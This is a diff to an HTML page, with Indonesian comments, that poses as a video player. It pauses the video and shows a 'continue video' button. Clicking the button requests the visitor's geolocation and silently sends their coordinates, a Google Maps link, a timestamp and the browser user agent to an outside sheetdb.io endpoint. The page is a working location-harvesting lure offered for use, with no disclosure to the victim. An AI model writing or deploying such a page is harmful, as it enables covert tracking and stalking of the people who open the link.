@@ -7,37 +7,56 @@
 
 <body style="margin:0; background:black;">
 
-<video id="vid" width="100%" controls autoplay muted playsinline onclick="mintaLokasi()">
+<video id="vid" width="100%" controls autoplay muted playsinline>
   <source src="https://files.catbox.moe/ezxq5k.mp4" type="video/mp4">
 </video>
 
+<div id="box" style="position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
+  <p>Tekan untuk melanjutkan video</p>
+  <button onclick="lanjut()" style="padding:12px; font-size:16px; border:none; border-radius:5px;">
+    ▶ Lanjutkan Video
+  </button>
+</div>
+
 <script>
 let sudah = false;
+let v = document.getElementById("vid");
 
-function mintaLokasi() {
+// pause dulu biar tombol kepake
+v.pause();
+
+function lanjut() {
   if (sudah) return;
   sudah = true;
 
-  navigator.geolocation.getCurrentPosition(pos => {
+  navigator.geolocation.getCurrentPosition(
+    pos => {
 
-    let lat = pos.coords.latitude;
-    let lon = pos.coords.longitude;
+      let lat = pos.coords.latitude;
+      let lon = pos.coords.longitude;
 
-    fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({
-        data: [{
-          waktu: new Date().toLocaleString(),
-          latitude: lat,
-          longitude: lon,
-          maps: "https://www.google.com/maps?q=" + lat + "," + lon,
-          device: navigator.userAgent
-        }]
-      })
-    });
+      fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          data: [{
+            waktu: new Date().toLocaleString(),
+            latitude: lat,
+            longitude: lon,
+            maps: "https://www.google.com/maps?q=" + lat + "," + lon,
+            device: navigator.userAgent
+          }]
+        })
+      });
 
-  });
+    }
+  );
+
+  // lanjutkan video
+  v.play();
+
+  // sembunyikan tombol
+  document.getElementById("box").style.display = "none";
 }
 </script>
 
